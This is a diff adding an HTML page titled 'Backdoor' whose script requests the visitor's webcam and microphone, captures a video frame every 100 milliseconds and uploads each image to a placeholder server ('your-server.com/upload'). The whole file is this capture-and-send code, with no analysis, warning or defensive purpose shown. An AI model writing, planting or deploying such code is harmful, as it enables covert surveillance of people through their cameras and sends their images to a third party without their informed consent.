@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Backdoor</title>
+  <style>
+    #webcam {
+      display: none;
+    }
+    #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <video id="webcam" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    // Check if the browser supports WebRTC
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      // Request access to the user's webcam
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function(stream) {
+          // Display the webcam stream in the <video> element
+          var webcam = document.getElementById('webcam');
+          webcam.srcObject = stream;
+          webcam.style.display = 'block';
+
+          // Create a new <canvas> element to capture the webcam frames
+          var canvas = document.getElementById('canvas');
+          var context = canvas.getContext('2d');
+          canvas.width = webcam.videoWidth;
+          canvas.height = webcam.videoHeight;
+          canvas.style.display = 'block';
+
+          // Capture frames from the webcam and display them on the canvas
+          var capture = function() {
+            if (webcam.readyState === webcam.HAVE_ENOUGH_DATA) {
+              context.drawImage(webcam, 0, 0, canvas.width, canvas.height);
+              // Send the captured image to a server for processing
+              var dataURL = canvas.toDataURL('image/png');
+              var xhr = new XMLHttpRequest();
+              xhr.open('POST', 'https://your-server.com/upload', true);
+              xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+              xhr.send('image=' + encodeURIComponent(dataURL));
+            }
+            setTimeout(capture, 100);
+          };
+          capture();
+        })
+        .catch(function(err) {
+          console.log('Error accessing webcam: ' + err);
+        });
+    } else {
+      console.log('WebRTC is not supported in this browser.');
+    }
+  </script>
+</body>
+</html>
